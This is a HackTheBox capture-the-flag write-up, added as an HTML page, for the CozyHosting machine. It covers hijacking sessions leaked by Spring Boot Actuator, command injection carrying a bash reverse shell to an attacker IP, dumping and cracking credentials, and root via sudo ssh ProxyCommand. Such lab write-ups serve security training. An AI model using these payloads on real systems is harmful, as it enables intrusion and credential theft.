@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/cozyhosting.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] CozyHosting - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>CozyHosting</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">CozyHosting</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">spring boot actuator sessions leak</span>
+                    <span class="tag">session hijack</span>
+                    <span class="tag">command injection ($IFS)</span>
+                    <span class="tag">jar creds + bcrypt crack</span>
+                    <span class="tag">sudo ssh proxycommand (gtfobins)</span>
+                </div>
+
+                <img src="../../images/hackthebox/cozyhosting/index.png" alt="CozyHosting Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>The box exposes SSH and a web app served at <code>cozyhosting.htb</code>, so that goes into <code>/etc/hosts</code>. The site is a cloud hosting company page with a login, and requesting a bad path returns a Spring Boot Whitelabel Error Page, which tells me it is a Spring Boot application. That is worth a look because Spring Boot ships <strong>Actuator</strong> management endpoints, and they are frequently left exposed.</p>
+
+                <p>The actuator base path is reachable, and <code>/actuator/sessions</code> is enabled. It dumps the live session IDs mapped to their usernames, two of which belong to a logged-in user, <code>kanderson</code>:</p>
+
+                <pre><code>[cozyhosting] curl -s http://cozyhosting.htb/actuator/sessions
+{
+  "E2317086A7ADE655F23F0A50F929B7FD": "UNAUTHORIZED",
+  "87CD57D7DD0C21F767BDF2DE6EC33B6F": "UNAUTHORIZED",
+  "C2BF9CD626BCCB8D352FB373CEE1F319": "kanderson",
+  "F7CD7FB966FBC02AB1EFA2A240BF4465": "UNAUTHORIZED",
+  "A7DC17B2F9F8A7179DE44FA7E2C3EF1C": "kanderson"
+}</code></pre>
+
+                <h2>Exploitation</h2>
+
+                <p>Those session IDs are live <code>JSESSIONID</code> values. Setting the cookie to one of <code>kanderson</code>'s sessions and browsing to <code>/admin</code> lands me in the admin panel as that user, no password needed.</p>
+
+                <p>The admin panel has an "add host" feature that runs a server-side connectivity check by building an <code>ssh</code> command from the <code>hostname</code> and <code>username</code> fields. The <code>username</code> field is concatenated into that shell command unsanitised, which is a classic command injection. The catch is that whitespace breaks the app's own parsing, so the payload has to avoid spaces (using <code>$IFS</code> for a space, or redirection tricks that need none). I put a space-free bash reverse shell in the <code>username</code> field:</p>
+
+                <pre><code>hostname: localhost
+username: ribeirin@localhost;exec&lt;&gt;/dev/tcp/10.10.15.221/4444;bash&lt;&amp;0&gt;&amp;0;#</code></pre>
+
+                <p>Submitting the form fires the shell back to my listener as the <code>app</code> user running the service.</p>
+
+                <pre><code>[cozyhosting] nc -lvnp 4444
+Connection received on 10.129.x.x
+app@cozyhosting:/app$ id</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>The process list shows the app is a Spring Boot jar:</p>
+
+                <pre><code>app  999  /usr/bin/java -jar cloudhosting-0.0.1.jar</code></pre>
+
+                <p>I pulled <code>cloudhosting-0.0.1.jar</code> back to my machine and unzipped it. A Spring Boot jar keeps its config in <code>BOOT-INF/classes/application.properties</code>, and that file carries the PostgreSQL credentials in cleartext:</p>
+
+                <pre><code>server.address=127.0.0.1
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&amp;nvzAQ7XxR</code></pre>
+
+                <p>The database is bound to localhost, but I already have a shell on the box, so I connected from there and dumped the <code>users</code> table:</p>
+
+                <pre><code>app@cozyhosting:/app$ psql -h localhost -U postgres
+Password for user postgres:
+postgres=# \c cozyhosting
+cozyhosting=# select * from users;
+   name    |                           password                           | role
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin</code></pre>
+
+                <p>Both are bcrypt (mode 3200). The <code>admin</code> hash cracks against rockyou:</p>
+
+                <pre><code>[cozyhosting] hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited</code></pre>
+
+                <p><code>manchesterunited</code> is reused as the SSH password for the system user <code>josh</code>, which is a clean login and the user flag:</p>
+
+                <pre><code>[cozyhosting] ssh josh@cozyhosting.htb
+josh@cozyhosting:~$ cat user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Checking <code>sudo</code> rights, <code>josh</code> can run <code>ssh</code> as root with a wildcard argument:</p>
+
+                <pre><code>josh@cozyhosting:~$ sudo -l
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *</code></pre>
+
+                <p>This is a <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">GTFOBins</a> classic. The <code>ProxyCommand</code> option is executed by <code>ssh</code> through <code>/bin/sh</code> before it connects, so pointing it at a shell command runs that command with the privileges of the <code>ssh</code> process, which here is root:</p>
+
+                <pre><code>josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // CozyHosting</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
